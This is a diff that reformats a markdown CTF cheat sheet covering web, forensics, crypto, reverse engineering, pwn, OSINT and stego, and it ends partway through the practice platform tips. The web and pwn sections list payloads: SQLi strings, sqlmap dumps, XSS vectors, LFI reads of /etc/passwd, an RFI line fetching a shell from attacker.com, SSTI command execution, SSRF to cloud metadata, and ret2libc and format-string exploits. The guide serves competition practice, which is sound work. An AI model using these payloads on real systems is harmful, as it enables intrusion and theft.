@@ -4,9 +4,9 @@
 
 | | |
 |---|---|
-| **Read this when** | You are prepping for or mid-competition in a CTF, you need the standard attack playbook and tooling for a specific category (web, forensics, crypto, RE, pwn, OSINT, stego), or you want ready-to-paste one-liners and platform recommendations to practice on |
-| **Start at** | [General CTF Strategy](#_1-general-ctf-strategy), [CTF Platform Quick Reference](#_9-ctf-platform-quick-reference), [Useful One-Liners and Quick Reference](#_10-useful-one-liners-and-quick-reference) |
-| **Pairs with** | [LABS.md](LABS.md), [REVERSE_ENGINEERING_REFERENCE.md](REVERSE_ENGINEERING_REFERENCE.md), [CRYPTOGRAPHY_REFERENCE.md](CRYPTOGRAPHY_REFERENCE.md), [OSINT_REFERENCE.md](OSINT_REFERENCE.md) |
+| Read this when | You are prepping for or mid-competition in a CTF, you need the standard attack playbook and tooling for a specific category (web, forensics, crypto, RE, pwn, OSINT, stego), or you want ready-to-paste one-liners and platform recommendations to practice on |
+| Start at | [General CTF Strategy](#_1-general-ctf-strategy), [CTF Platform Quick Reference](#_9-ctf-platform-quick-reference), [Useful One-Liners and Quick Reference](#_10-useful-one-liners-and-quick-reference) |
+| Pairs with | [LABS.md](LABS.md), [REVERSE_ENGINEERING_REFERENCE.md](REVERSE_ENGINEERING_REFERENCE.md), [CRYPTOGRAPHY_REFERENCE.md](CRYPTOGRAPHY_REFERENCE.md), [OSINT_REFERENCE.md](OSINT_REFERENCE.md) |
 
 ---
 
@@ -29,26 +29,26 @@
 
 ### Approaching a CTF
 
-**Triage all challenges first.**
-Before diving deep, spend 5–10 minutes reading every challenge title and description. Look for:
+Triage all challenges first.
+Before diving deep, spend 5-10 minutes reading every challenge title and description. Look for:
 - Quick wins (challenges with high solve counts = easier)
 - Challenges that match your team's strengths
 - Challenges with attachments vs. remote-only (remote means network/web/pwn)
 - Point values (higher points = harder)
 
-**Pick your strengths.**
+Pick your strengths.
 Assign challenges based on individual expertise. A crypto specialist should not spend 3 hours on a web challenge when a web expert is idle. Communicate constantly about who owns what.
 
-**Time-box hard challenges.**
-If you have been stuck on a challenge for 45–60 minutes without meaningful progress:
+Time-box hard challenges.
+If you have been stuck on a challenge for 45-60 minutes without meaningful progress:
 - Write down what you have tried and your current hypothesis
 - Hand it off to a teammate or put it on hold
 - Return with fresh eyes later
 - Do NOT let one hard challenge consume the whole competition
 
-**Flag submission hygiene.**
+Flag submission hygiene.
 - Always trim whitespace when submitting flags
-- Check the flag format (`CTF{...}`, `flag{...}`, `picoCTF{...}`, etc.) — read the rules
+- Check the flag format (`CTF{...}`, `flag{...}`, `picoCTF{...}`, etc.): read the rules
 - Submit as soon as you find it; do not batch submits
 - Keep a log of flags found even before submitting
 
@@ -56,26 +56,26 @@ If you have been stuck on a challenge for 45–60 minutes without meaningful pro
 
 - Use a shared workspace: Discord, Slack, or a dedicated CTF server
 - Maintain a live challenge tracker (Google Sheet or HedgeDoc table) with columns: `Challenge | Category | Owner | Status | Notes`
-- Avoid duplicate work — always announce when you start a challenge
+- Avoid duplicate work: always announce when you start a challenge
 - Share partial findings immediately; a 50% solve note can unblock a teammate
 - Designate one person to handle flag submission and score tracking
-- During long CTFs (24–48 hours), schedule rest rotations so someone is always active
+- During long CTFs (24-48 hours), schedule rest rotations so someone is always active
 - Keep a shared notes document with all commands run, findings, and dead ends — this saves time when handoffs happen
 
 ### Setting Up a CTF Environment
 
-**Note-taking.**
+Note-taking.
 - Obsidian or CherryTree for local, offline markdown notes with challenge trees
 - HedgeDoc or HackMD for real-time collaborative team notes
 - Joplin for cross-platform sync
 - Structure notes: one page per challenge, include: description, files, commands tried, findings, flag
 
-**Tool layout.**
+Tool layout.
 - Use a tiling window manager or tmux to keep terminal, browser, and notes visible simultaneously
 - Recommended tmux layout: left pane = work terminal, right pane = notes/reference, bottom = file viewer
 - Keep a browser profile specifically for CTFs with all tools bookmarked
 
-**VM Setup.**
+VM Setup.
 - Primary: Kali Linux (most tools pre-installed) or Parrot OS
 - Secondary: REMnux (malware/forensics analysis)
 - Windows VM: for `.exe` RE, x64dbg, and Windows-specific challenges
@@ -101,12 +101,12 @@ If you have been stuck on a challenge for 45–60 minutes without meaningful pro
 
 Always start by mapping the attack surface before touching any inputs:
 
-- **`robots.txt`** — often reveals hidden paths (`/admin`, `/backup`, `/secret`)
-- **Page source (`Ctrl+U`)** — look for HTML comments, hidden form fields, API endpoints, hardcoded credentials, JS file references
-- **JavaScript files** — enumerate all `.js` files; search for API keys, endpoints, authentication logic, and secrets using browser DevTools Sources tab or `grep`
-- **Cookies** — inspect all cookies: look for Base64-encoded JSON, JWT tokens, session identifiers that look sequential or guessable
-- **HTTP headers** — check `Server`, `X-Powered-By`, `X-Frame-Options`, `Content-Security-Policy` — these reveal the tech stack and misconfigurations
-- **Tech stack fingerprinting** — use `whatweb`, Wappalyzer browser extension, or check `generator` meta tags
+- `robots.txt`: often reveals hidden paths (`/admin`, `/backup`, `/secret`)
+- Page source (`Ctrl+U`): look for HTML comments, hidden form fields, API endpoints, hardcoded credentials, JS file references
+- JavaScript files: enumerate all `.js` files; search for API keys, endpoints, authentication logic, and secrets using browser DevTools Sources tab or `grep`
+- Cookies: inspect all cookies: look for Base64-encoded JSON, JWT tokens, session identifiers that look sequential or guessable
+- HTTP headers: check `Server`, `X-Powered-By`, `X-Frame-Options`, `Content-Security-Policy` — these reveal the tech stack and misconfigurations
+- Tech stack fingerprinting: use `whatweb`, Wappalyzer browser extension, or check `generator` meta tags
 
 ```bash
 # Quick recon one-liner
@@ -117,7 +117,7 @@ curl -s https://target.com/sitemap.xml
 
 ### Common Techniques
 
-**SQL Injection (SQLi)**
+SQL Injection (SQLi)
 - Try `'`, `"`, `1'--`, `1' OR '1'='1` in all input fields
 - Use `sqlmap` for automated exploitation:
 ```bash
@@ -128,33 +128,33 @@ sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
 sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
 ```
 
-**Cross-Site Scripting (XSS)**
+Cross-Site Scripting (XSS)
 - Test all input fields with `<script>alert(1)</script>` and variations
 - If filtered, try: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `javascript:alert(1)`
 - For blind XSS, use a callback URL (requestbin, interactsh) to confirm execution
 - For DOM-based XSS, look in JS source for sinks: `innerHTML`, `eval`, `setTimeout` with user-controlled data — these are dangerous patterns in client-side code that can execute attacker-controlled strings
 
-**Local/Remote File Inclusion (LFI/RFI)**
+Local/Remote File Inclusion (LFI/RFI)
 - Test path traversal: `../../etc/passwd`, `....//....//etc/passwd`
 - PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`
 - Log poisoning via LFI: inject PHP into User-Agent, then include the log file
 - RFI (rare, requires `allow_url_include=On`): `?page=http://attacker.com/shell.php`
 
-**Server-Side Request Forgery (SSRF)**
+Server-Side Request Forgery (SSRF)
 - Test URL parameters that fetch external resources
 - Try: `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254` (AWS metadata)
 - Bypass filters: `http://127.0.0.1:22`, `http://0x7f000001`, `http://[::1]`
 - Cloud metadata endpoints: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP)
 
-**JWT Attacks**
+JWT Attacks
 - Decode JWT at jwt.io or with CyberChef
 - Try `alg: none` attack: remove signature, set algorithm to `none`
 - Try RS256 to HS256 confusion: if you have the public key, sign with it as HMAC secret
 - Brute-force weak secrets: `hashcat -a 0 -m 16500 <token> wordlist.txt`
 - Check for `kid` header injection (SQL/path traversal in key ID)
 
-**Server-Side Template Injection (SSTI)**
-- Test with `{{7*7}}` — if output is `49`, SSTI is confirmed
+Server-Side Template Injection (SSTI)
+- Test with `{{7*7}}`: if output is `49`, SSTI is confirmed
 - Jinja2 (Python): `{{config}}`, `{{''.__class__.__mro__[1].__subclasses__()}}`
 - Twig (PHP): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
 - FreeMarker (Java): `${"freemarker.template.utility.Execute"?new()("id")}`
@@ -162,7 +162,7 @@ sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
 
 ### IDOR and Broken Access Control
 
-- IDOR (Insecure Direct Object Reference): change numeric IDs in URLs/parameters (`?id=1` → `?id=2`)
+- IDOR (Insecure Direct Object Reference): change numeric IDs in URLs/parameters (`?id=1` -> `?id=2`)
 - Try accessing `/api/user/2` when logged in as user 1
 - Check if user-specific resources are accessible without authentication
 - Test horizontal privilege escalation (accessing other users' data) and vertical (accessing admin functions)
@@ -170,11 +170,11 @@ sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
 
 ### Authentication Bypasses
 
-- **Default credentials**: `admin:admin`, `admin:password`, `admin:123456`, check vendor-specific defaults
-- **SQLi login bypass**: `' OR '1'='1' --`, `admin'--`, `' OR 1=1 --`
-- **Cookie manipulation**: decode and modify role/admin fields in cookies; re-encode and resend
-- **Password reset flaws**: predictable tokens, host header injection in reset links, user enumeration via timing
-- **HTTP verb tampering**: try `GET` instead of `POST`, or `PUT`/`DELETE` on restricted endpoints
+- Default credentials: `admin:admin`, `admin:password`, `admin:123456`, check vendor-specific defaults
+- SQLi login bypass: `' OR '1'='1' --`, `admin'--`, `' OR 1=1 --`
+- Cookie manipulation: decode and modify role/admin fields in cookies; re-encode and resend
+- Password reset flaws: predictable tokens, host header injection in reset links, user enumeration via timing
+- HTTP verb tampering: try `GET` instead of `POST`, or `PUT`/`DELETE` on restricted endpoints
 
 ### Useful Tools
 
@@ -200,7 +200,7 @@ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-li
 
 ### General Web Approach
 
-1. Read the challenge description carefully — hints are often there
+1. Read the challenge description carefully: hints are often there
 2. Map all visible endpoints and inputs
 3. Identify the tech stack (language, framework, server)
 4. Test every input field systematically
@@ -223,7 +223,7 @@ xxd suspicious_file | head    # Hex dump of first bytes
 hexdump -C suspicious_file | head
 ```
 
-**Common magic bytes:**
+Common magic bytes:
 
 | Format | Hex Signature |
 | --- | --- |
@@ -236,7 +236,7 @@ hexdump -C suspicious_file | head
 | PE (Windows) | `4D 5A` (`MZ`) |
 | 7-Zip | `37 7A BC AF 27 1C` |
 
-**binwalk** — scan for embedded files and file systems:
+binwalk — scan for embedded files and file systems:
 ```bash
 binwalk suspicious_file           # List embedded files
 binwalk -e suspicious_file        # Extract embedded files
@@ -255,12 +255,12 @@ strings file.bin | grep -i flag  # Grep strings for flag patterns
 
 ### Disk and Filesystem Analysis
 
-**Autopsy** — GUI forensics platform (recommended for beginners):
+Autopsy — GUI forensics platform (recommended for beginners):
 - Open disk image (`.dd`, `.img`, `.E01`)
 - Run ingest modules: recent activity, keyword search, hash lookup
 - Browse file system, deleted files, artifacts, and timeline
 
-**The Sleuth Kit (TSK)** — command-line disk forensics:
+The Sleuth Kit (TSK) — command-line disk forensics:
 ```bash
 mmls disk.img                    # Show partition layout
 fls -r -o 2048 disk.img          # List files recursively (offset from mmls)
@@ -268,9 +268,9 @@ icat -o 2048 disk.img 15         # Extract file by inode number
 fsstat -o 2048 disk.img          # Filesystem statistics
 ```
 
-**FTK Imager / FTK Lite** — acquire and examine disk images on Windows.
+FTK Imager / FTK Lite — acquire and examine disk images on Windows.
 
-**ext4 carving** — if filesystem is damaged:
+ext4 carving — if filesystem is damaged:
 ```bash
 extundelete disk.img --restore-all
 ```
@@ -297,28 +297,28 @@ vol.py -f memory.raw linux.bash              # Bash history (Linux)
 
 ### Steganography
 
-**steghide** — hides data in JPEG/BMP/WAV/AU:
+steghide — hides data in JPEG/BMP/WAV/AU:
 ```bash
 steghide info image.jpg          # Check for embedded data
 steghide extract -sf image.jpg   # Extract (will prompt for password)
 steghide extract -sf image.jpg -p ""  # Try empty password
 ```
 
-**zsteg** — LSB steganography in PNG and BMP:
+zsteg — LSB steganography in PNG and BMP:
 ```bash
 zsteg image.png                  # Try all common methods
 zsteg -a image.png               # Try all methods (exhaustive)
 zsteg image.png -E "b1,rgb,lsb,xy"  # Specific channel extraction
 ```
 
-**stegsolve** — GUI tool for image layer analysis:
+stegsolve — GUI tool for image layer analysis:
 - Open image, cycle through color planes with arrows
-- Analyse → Data Extract for LSB extraction
-- Analyse → Frame Browser for animated GIFs
+- Analyse -> Data Extract for LSB extraction
+- Analyse -> Frame Browser for animated GIFs
 
-**OpenStego** — GUI steganography for PNG files.
+OpenStego — GUI steganography for PNG files.
 
-**LSB analysis** — manual approach:
+LSB analysis — manual approach:
 ```python
 from PIL import Image
 img = Image.open("image.png")
@@ -329,26 +329,26 @@ bits = [pixel[0] & 1 for pixel in pixels]  # LSB of red channel
 
 ### Network Capture Analysis
 
-**Wireshark** — primary GUI tool:
+Wireshark — primary GUI tool:
 - `File → Export Objects → HTTP` to extract transferred files
 - Filter examples:
-  - `http` — HTTP traffic only
-  - `tcp.stream eq 0` — follow TCP stream 0
-  - `dns` — DNS queries
-  - `ftp-data` — FTP file transfers
-  - `frame contains "flag"` — search for flag string
-  - `ip.addr == 192.168.1.1` — filter by IP
+  - `http`: HTTP traffic only
+  - `tcp.stream eq 0`: follow TCP stream 0
+  - `dns`: DNS queries
+  - `ftp-data`: FTP file transfers
+  - `frame contains "flag"`: search for flag string
+  - `ip.addr == 192.168.1.1`: filter by IP
 
-**tshark** — command-line Wireshark:
+tshark — command-line Wireshark:
 ```bash
 tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
 tshark -r capture.pcap -qz io,phs          # Protocol hierarchy stats
 tshark -r capture.pcap --export-objects http,./output/
 ```
 
-**NetworkMiner** — Windows GUI for extracting files, credentials, and artifacts from pcap.
+NetworkMiner — Windows GUI for extracting files, credentials, and artifacts from pcap.
 
-**tcpdump** — capture and filter:
+tcpdump — capture and filter:
 ```bash
 tcpdump -r capture.pcap -A 'port 80'       # Read and display ASCII
 tcpdump -r capture.pcap -w filtered.pcap 'host 10.0.0.1'
@@ -374,14 +374,14 @@ photorec disk.img
 
 ### Classical Ciphers
 
-**Always try dcode.fr first for classical/unknown ciphers.** The cipher identifier at https://www.dcode.fr/cipher-identifier can automatically identify the cipher type.
+Always try dcode.fr first for classical/unknown ciphers. The cipher identifier at https://www.dcode.fr/cipher-identifier can automatically identify the cipher type.
 
 | Cipher | Key Clue | Attack |
 | --- | --- | --- |
 | Caesar | Shift by N | Try all 25 shifts or use dcode.fr |
 | ROT13 | Common in CTFs | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` or CyberChef |
 | Vigenère | Repeating key | Kasiski analysis, IC analysis, dcode.fr |
-| Atbash | A↔Z mirror | `tr 'A-Za-z' 'Z-AZa-z'` |
+| Atbash | A<->Z mirror | `tr 'A-Za-z' 'Z-AZa-z'` |
 | Rail Fence | Zigzag pattern | dcode.fr rail fence decoder |
 | Playfair | 5x5 key square | dcode.fr Playfair decoder |
 | Substitution | Random letter mapping | Frequency analysis, quipqiup.com |
@@ -400,7 +400,7 @@ for i in range(26):
 
 ### Modern Crypto Weaknesses
 
-**Weak RSA — Low Public Exponent (e=3)**
+Weak RSA — Low Public Exponent (e=3)
 If `e=3` and the message `m` is small, then `c = m^3` without wrapping, so `m = cube_root(c)`:
 ```python
 from gmpy2 import iroot
@@ -409,7 +409,7 @@ if exact:
     print(bytes.fromhex(hex(m)[2:]))
 ```
 
-**Weak RSA — Common Modulus Attack**
+Weak RSA — Common Modulus Attack
 If two ciphertexts use the same modulus `n` but different exponents `e1`, `e2` (with `gcd(e1,e2)=1`):
 ```python
 from sympy import gcdex
@@ -417,17 +417,17 @@ s1, s2, _ = gcdex(e1, e2)
 m = pow(c1, s1, n) * pow(c2, s2, n) % n
 ```
 
-**Weak RSA — Small Primes / Factorable N**
+Weak RSA — Small Primes / Factorable N
 - Try factordb.com first: paste `n` and see if it is already factored
 - Use `RsaCtfTool`: `python3 RsaCtfTool.py --publickey key.pem --uncipherfile cipher.txt`
 - SageMath for advanced factoring: Fermat factorization for close primes
 
-**CBC Bit-Flipping**
+CBC Bit-Flipping
 Modifying a byte in ciphertext block `i` corrupts block `i` but predictably flips the corresponding byte in block `i+1` plaintext:
 - Find offset of target byte in plaintext
 - `new_cipher_byte = original_cipher_byte XOR original_plain_byte XOR desired_plain_byte`
 
-**ECB Mode Detection**
+ECB Mode Detection
 ECB encrypts each block independently — identical 16-byte plaintext blocks produce identical ciphertext blocks:
 ```python
 # Detect ECB: submit 48 identical bytes, check for repeated blocks
@@ -437,10 +437,10 @@ if len(blocks) != len(set(blocks)):
     print("ECB mode detected")
 ```
 
-**AES-GCM Nonce Reuse**
+AES-GCM Nonce Reuse
 If two different messages are encrypted with the same nonce and key, XOR the ciphertexts to cancel the keystream. With one known plaintext, recover the other.
 
-**Reused IV in CBC**
+Reused IV in CBC
 If IV is reused and you can control plaintext, mount a chosen-plaintext attack to recover the IV or decrypt arbitrary ciphertexts.
 
 ### Hashing Challenges
@@ -460,7 +460,7 @@ hashcat -a 3 -m 0 hash.txt '?a?a?a?a?a?a'                        # Brute-force 6
 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-**Hashcat mode reference (common):**
+Hashcat mode reference (common):
 
 | Hash | Mode |
 | --- | --- |
@@ -490,7 +490,7 @@ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 ### Static Analysis
 
-**Start with `strings` and `file`:**
+Start with `strings` and `file`:
 ```bash
 file binary
 strings binary | grep -i flag
@@ -498,20 +498,20 @@ strings binary | grep -i pass
 strings -n 6 binary | less
 ```
 
-**Ghidra** (free, NSA-developed):
-1. New project → Import file → Auto-analyze (accept defaults)
+Ghidra (free, NSA-developed):
+1. New project -> Import file -> Auto-analyze (accept defaults)
 2. Navigate to `main` in Symbol Tree or search for it
-3. Use Decompiler window — right-click variables to rename for clarity
-4. Search → Search Memory for flag patterns
+3. Use Decompiler window: right-click variables to rename for clarity
+4. Search -> Search Memory for flag patterns
 
-**IDA Free** — powerful disassembler, free version for non-commercial use:
+IDA Free — powerful disassembler, free version for non-commercial use:
 - Better than Ghidra for initial navigation in many cases
 - `F5` for pseudocode (limited in free version)
 - `n` to rename, `y` to retype
 
-**Binary Ninja** — modern RE platform with a free cloud version at cloud.binary.ninja.
+Binary Ninja — modern RE platform with a free cloud version at cloud.binary.ninja.
 
-**readelf / objdump:**
+readelf / objdump:
 ```bash
 readelf -s binary          # Symbol table
 readelf -h binary          # ELF header
@@ -521,7 +521,7 @@ objdump -M intel -d binary # Intel syntax disassembly
 
 ### Dynamic Analysis
 
-**GDB with pwndbg (recommended):**
+GDB with pwndbg (recommended):
 ```bash
 gdb ./binary
 pwndbg> run
@@ -533,46 +533,46 @@ pwndbg> x/s 0x402010       # Examine string at address
 pwndbg> x/20wx $rsp        # Examine stack
 ```
 
-**GDB with PEDA** — alternative plugin with pattern tools:
+GDB with PEDA — alternative plugin with pattern tools:
 ```bash
 gdb-peda$ pattern create 200    # Create cyclic pattern
 gdb-peda$ pattern offset $rsp   # Find offset
 ```
 
-**strace / ltrace:**
+strace / ltrace:
 ```bash
 strace ./binary             # Trace system calls
 ltrace ./binary             # Trace library calls
 strace -e openat ./binary   # Only file open syscalls
 ```
 
-**x64dbg (Windows)** — GUI debugger for Windows PE binaries:
+x64dbg (Windows) — GUI debugger for Windows PE binaries:
 - Set breakpoints on `strcmp`, `memcmp`, check registers at comparison
 - Use "Follow in Dump" to inspect memory
 
 ### Decompilation Tips
 
 - Ghidra and Cutter (Rizin-based) both offer decompilation
-- Always rename variables as you understand them (`local_20` → `user_input`)
-- Look for `strcmp`, `memcmp`, `strncmp` calls — these often compare your input to the flag
+- Always rename variables as you understand them (`local_20` -> `user_input`)
+- Look for `strcmp`, `memcmp`, `strncmp` calls: these often compare your input to the flag
 - Follow the control flow from `main()` down to the input validation logic
 - Check for self-modifying code: the binary may decrypt the flag at runtime
 
 ### Anti-Debugging Techniques
 
-**ptrace-based anti-debug:**
+ptrace-based anti-debug:
 ```c
 if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) { exit(1); }
 ```
 - Bypass: patch the `jne`/`je` after the check, or preload a library that intercepts `ptrace`
 
-**Timing checks:**
+Timing checks:
 - Binary measures execution time; if too slow (being debugged), it exits or gives wrong output
 - Bypass: NOP the timing check, or use hardware breakpoints (do not affect timing like software breakpoints)
 
-**Other anti-debug:**
-- `IsDebuggerPresent()` (Windows) — patch return value or use ScyllaHide plugin in x64dbg
-- Checksum of own code — patching instructions will fail the check; patch the check too
+Other anti-debug:
+- `IsDebuggerPresent()` (Windows): patch return value or use ScyllaHide plugin in x64dbg
+- Checksum of own code: patching instructions will fail the check; patch the check too
 
 ### General RE Approach
 
@@ -590,13 +590,13 @@ if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) { exit(1); }
 
 ### x86/x64 Calling Conventions and Stack Layout
 
-**x64 Linux (System V AMD64 ABI):**
+x64 Linux (System V AMD64 ABI):
 - Arguments: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, then stack
 - Return value: `rax`
 - Caller-saved: `rax`, `rcx`, `rdx`, `rsi`, `rdi`, `r8`-`r11`
 - Callee-saved: `rbx`, `rbp`, `r12`-`r15`
 
-**Stack frame layout (growing downward):**
+Stack frame layout (growing downward):
 ```
 High addresses
 [ previous frames     ]
@@ -610,13 +610,13 @@ Low addresses
 
 ### Finding Vulnerabilities
 
-**checksec:**
+checksec:
 ```bash
 checksec --file=./binary
 # Look for: NX (no-exec stack), PIE (ASLR), stack canary, RELRO
 ```
 
-**pwndbg stack view:**
+pwndbg stack view:
 ```
 pwndbg> cyclic 200         # Create De Bruijn pattern
 pwndbg> run <<< $(cyclic 200)
@@ -645,13 +645,13 @@ p.interactive()
 
 Used when NX is enabled (no executable stack) — chain small "gadgets" ending in `ret`.
 
-**Find gadgets:**
+Find gadgets:
 ```bash
 ROPgadget --binary ./binary --rop
 ropper -f ./binary
 ```
 
-**pwntools ROP class:**
+pwntools ROP class:
 ```python
 from pwn import *
 elf = ELF('./binary')
@@ -663,7 +663,7 @@ print(rop.dump())
 payload = b'A' * offset + rop.chain()
 ```
 
-**ret2libc (no PIE, known libc):**
+ret2libc (no PIE, known libc):
 ```python
 # Leak libc base, then call system("/bin/sh")
 libc = ELF('./libc.so.6')
@@ -674,14 +674,14 @@ rop.system(next(libc.search(b'/bin/sh')))
 
 ### Format String Exploitation
 
-**Reading memory (`%p` leaks):**
+Reading memory (`%p` leaks):
 ```
 %p %p %p %p %p %p %p %p    # Print 8 stack values as hex pointers
 %7$p                        # Print 7th argument directly
 %7$s                        # Print string at address in 7th argument
 ```
 
-**Arbitrary write (`%n`):**
+Arbitrary write (`%n`):
 ```python
 from pwn import *
 # %n writes number of bytes printed so far to the address in the corresponding argument
@@ -689,7 +689,7 @@ from pwn import *
 payload = fmtstr_payload(offset, {target_addr: value_to_write})
 ```
 
-**Finding the offset:**
+Finding the offset:
 ```
 Send: AAAA.%p.%p.%p.%p.%p
 Look for: 0x41414141 in output -> that position is the offset
@@ -697,16 +697,16 @@ Look for: 0x41414141 in output -> that position is the offset
 
 ### Heap Exploitation Basics
 
-**Use-After-Free (UAF):**
+Use-After-Free (UAF):
 - Object is freed but pointer is not cleared
 - Allocate new object of same size; it lands in the same memory
 - Old pointer now points to attacker-controlled data
 
-**Double-Free:**
+Double-Free:
 - Freeing a chunk twice corrupts freelist metadata
 - In tcache (glibc 2.27+): first double-free is often detectable via key field; bypass requires clearing key
 
-**Tcache Poison (glibc 2.27–2.31):**
+Tcache Poison (glibc 2.27-2.31):
 - Overwrite `fd` pointer of freed tcache chunk with target address
 - Next two allocations: first returns original chunk, second returns target address
 - Write shellcode or function pointer at target
@@ -760,23 +760,23 @@ Common places to check manually: GitHub, Twitter/X, Instagram, Reddit, LinkedIn,
 
 ### Image Reverse Search
 
-- **Google Images** — drag and drop image or paste URL; good for common images
-- **TinEye** — https://tineye.com — finds exact matches and traces image history
-- **Yandex Images** — https://yandex.com/images — best for faces and obscure images, especially non-Western content
-- **Bing Visual Search** — sometimes finds results others miss
+- Google Images: drag and drop image or paste URL; good for common images
+- TinEye: https://tineye.com — finds exact matches and traces image history
+- Yandex Images: https://yandex.com/images — best for faces and obscure images, especially non-Western content
+- Bing Visual Search: sometimes finds results others miss
 
-**Workflow:** Try all four; each has different indexes. Yandex is often the most powerful for CTF geolocation challenges.
+Workflow: Try all four; each has different indexes. Yandex is often the most powerful for CTF geolocation challenges.
 
 ### Geolocation
 
-**From an image:**
+From an image:
 1. Extract EXIF GPS: `exiftool image.jpg | grep GPS`
 2. If no GPS, use visual clues: street signs, license plates, building styles, flora, sun angle
-3. **overpass-turbo** (https://overpass-turbo.eu) — query OpenStreetMap for specific features (e.g., find all bus stops with a specific name)
-4. **Google Street View** — manually navigate to suspected area; use `pegman` to drop into street view
-5. **GeoGuessr clues**: road markings, utility poles, vehicle makes, languages on signs
+3. overpass-turbo (https://overpass-turbo.eu): query OpenStreetMap for specific features (e.g., find all bus stops with a specific name)
+4. Google Street View: manually navigate to suspected area; use `pegman` to drop into street view
+5. GeoGuessr clues: road markings, utility poles, vehicle makes, languages on signs
 
-**Tools for geolocation:**
+Tools for geolocation:
 ```
 https://overpass-turbo.eu       # OSM query tool
 https://www.google.com/maps     # Street View exploration
@@ -786,11 +786,11 @@ https://www.maxmind.com         # IP geolocation
 
 ### Social Media and Web History
 
-- **Wayback Machine** (https://web.archive.org) — check historical versions of websites and profiles
-- **Google cache** — `cache:target.com` in Google search
-- **Cached pages** — search `site:web.archive.org username`
-- **LinkedIn** — check employment history, endorsements, connections for clues
-- **Pastebin** — search `site:pastebin.com target_username` in Google
+- Wayback Machine (https://web.archive.org): check historical versions of websites and profiles
+- Google cache: `cache:target.com` in Google search
+- Cached pages: search `site:web.archive.org username`
+- LinkedIn: check employment history, endorsements, connections for clues
+- Pastebin: search `site:pastebin.com target_username` in Google
 
 ### Domain and IP Investigation
 
@@ -805,7 +805,7 @@ dig domain.com TXT
 dig -x 1.2.3.4                    # Reverse DNS lookup
 ```
 
-**Online tools:**
+Online tools:
 
 | Tool | Purpose | URL |
 | --- | --- | --- |
@@ -831,39 +831,39 @@ subfinder -d target.com -o subdomains.txt
 ### Initial Triage Checklist
 
 For any file in a misc/stego challenge:
-1. `file <filename>` — verify file type
-2. `exiftool <filename>` — check metadata
-3. `strings <filename> | grep -i flag` — search for readable strings
+1. `file <filename>`: verify file type
+2. `exiftool <filename>`: check metadata
+3. `strings <filename> | grep -i flag`: search for readable strings
 4. Check if it is a ZIP/archive disguised with another extension
-5. `binwalk <filename>` — look for embedded files
+5. `binwalk <filename>`: look for embedded files
 6. XOR the file against common single-byte keys: `python3 -c "d=open('f','rb').read(); [print(hex(k), bytes(b^k for b in d).decode(errors='ignore')) for k in range(256)]"`
 7. Check for base encoding in strings output
 
 ### Audio Challenges
 
-**Audacity** — open audio file, view spectrogram:
-- View → Spectrogram to see frequency spectrum
+Audacity — open audio file, view spectrogram:
+- View -> Spectrogram to see frequency spectrum
 - Hidden messages are often visible as text/images in the spectrogram
-- Change spectrogram settings (View → Spectrogram Settings) for better resolution
+- Change spectrogram settings (View -> Spectrogram Settings) for better resolution
 
 ```bash
 # View spectrogram from command line
 sox audio.wav -n spectrogram -o spectrogram.png
 ```
 
-**DTMF decoding** (phone tones):
+DTMF decoding (phone tones):
 - Use online DTMF decoder or `multimon-ng`
 ```bash
 sox audio.wav -r 22050 -c 1 /tmp/audio_mono.wav
 multimon-ng -t wav -a DTMF /tmp/audio_mono.wav
 ```
 
-**Morse code:**
+Morse code:
 - Listen for dots/dashes in audio
 - Use `morse2ascii` or fldigi software modem
 - CyberChef has a Morse decode operation
 
-**LSB in audio (WAV):**
+LSB in audio (WAV):
 ```python
 import wave
 w = wave.open('audio.wav', 'rb')
@@ -874,12 +874,12 @@ lsbs = bytes([b & 1 for b in frames])
 
 ### Image Stego Deep Dive
 
-**stegsolve workflow:**
+stegsolve workflow:
 1. Open image, cycle through color planes (left/right arrow keys)
 2. Look for patterns, hidden text, or QR codes in specific bit planes
-3. Analyse → Data Extract: check all bit planes and order combinations
-4. Analyse → Steganography for LSB extraction with different parameters
-5. Analyse → Frame Browser for animated images
+3. Analyse -> Data Extract: check all bit planes and order combinations
+4. Analyse -> Steganography for LSB extraction with different parameters
+5. Analyse -> Frame Browser for animated images
 
 ```bash
 # zsteg -- PNG/BMP LSB analysis
@@ -920,7 +920,7 @@ zbarimg --raw image.png          # Raw output
 | URL encoding | `%48%65%6c%6c%6f` | `python3 -c "import urllib.parse; print(urllib.parse.unquote('...'))"` |
 | HTML entities | `&#72;&#101;` | CyberChef, browser console |
 
-**Multi-layer decoding tip:** In CyberChef, use "Magic" operation to automatically detect and chain multiple encodings. Alternatively, try the "Detect File Type" operation if you suspect binary content.
+Multi-layer decoding tip: In CyberChef, use "Magic" operation to automatically detect and chain multiple encodings. Alternatively, try the "Detect File Type" operation if you suspect binary content.
 
 ---
 
@@ -936,14 +936,14 @@ zbarimg --raw image.png          # Raw output
 | OverTheWire | https://overthewire.org | SSH-based wargames, progressive difficulty | Linux basics, networking, web, crypto |
 | CryptoHack | https://cryptohack.org | Excellent crypto curriculum, interactive | Cryptography, math-heavy challenges |
 
-**Tips for each:**
-- **HackTheBox**: Use the "Starting Point" machines for guided intro; look at retired machines for writeups
-- **TryHackMe**: Complete the "Pre-Security" and "Jr Penetration Tester" paths before CTFs
-- **PicoCTF**: Great for building fundamentals; picoCTF gym has all past challenges available year-round
-- **CTFtime**: Check upcoming CTF events, filter by weight and type; team registration happens here
-- **pwn.college**: Work through modules sequentially; the dojos are self-contained and auto-graded
-- **OverTheWire**: Start with Bandit (Linux basics) → Leviathan → Natas (web) → Narnia (binary)
